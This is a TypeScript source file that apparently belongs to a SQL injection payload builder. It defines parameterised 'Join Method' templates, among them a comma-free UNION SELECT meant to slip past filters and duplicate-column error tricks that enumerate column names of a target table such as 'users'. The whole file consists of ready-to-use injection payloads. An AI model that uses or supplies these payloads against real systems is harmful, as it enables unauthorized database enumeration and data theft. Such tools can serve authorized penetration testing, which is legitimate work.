import { BuilderSubcategory, TemplateConfig } from '../../types';

export const joinTemplates: TemplateConfig[] = [
  {
    id: 'join-no-comma-union',
    name: 'No-Comma UNION (JOIN Columns)',
    description: 'Constructs multi-column UNION result without comma characters using JOIN subqueries',
    content: 'UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c'
  },
  {
    id: 'join-duplicate-column-init',
    name: 'Duplicate Column Discovery (JOIN self)',
    description: 'Extracts the first column name via duplicate column error',
    content: '(SELECT * FROM (SELECT * FROM {table_name} a JOIN {table_name} b)c)',
    parameters: [
      {
        id: 'table_name',
        label: 'Table name',
        defaultValue: 'users',
        inputType: 'text'
      }
    ]
  },
  {
    id: 'join-duplicate-column-using',
    name: 'Duplicate Column with USING()',
    description: 'Extracts successive column names by excluding known columns in USING()',
    content: '(SELECT * FROM (SELECT * FROM {table_name} a JOIN {table_name} b USING({column_name}))c)',
    parameters: [
      {
        id: 'table_name',
        label: 'Table name',
        defaultValue: 'users',
        inputType: 'text'
      },
      {
        id: 'column_name',
        label: 'Known columns (comma separated)',
        defaultValue: 'id',
        inputType: 'text'
      }
    ]
  },
  {
    id: 'join-natural-clause',
    name: 'NATURAL JOIN Expression',
    description: 'Combines rows across tables with identically named columns',
    content: '(SELECT * FROM {table_name} a NATURAL JOIN {table_name} b)',
    parameters: [
      {
        id: 'table_name',
        label: 'Table name',
        defaultValue: 'users',
        inputType: 'text'
      }
    ]
  },
  {
    id: 'join-cross-select',
    name: 'CROSS JOIN Columns',
    description: 'Cartesian cross join to build columns without comma syntax',
    content: '(SELECT * FROM (SELECT 1)x CROSS JOIN (SELECT 2)y)'
  }
];

export const joinSubcategory: BuilderSubcategory = {
  id: 'join',
  label: 'Join Method',
  description: 'Join clause templates (No-comma UNION, Duplicate column discovery USING, Natural/Cross JOIN)',
  templates: joinTemplates
};
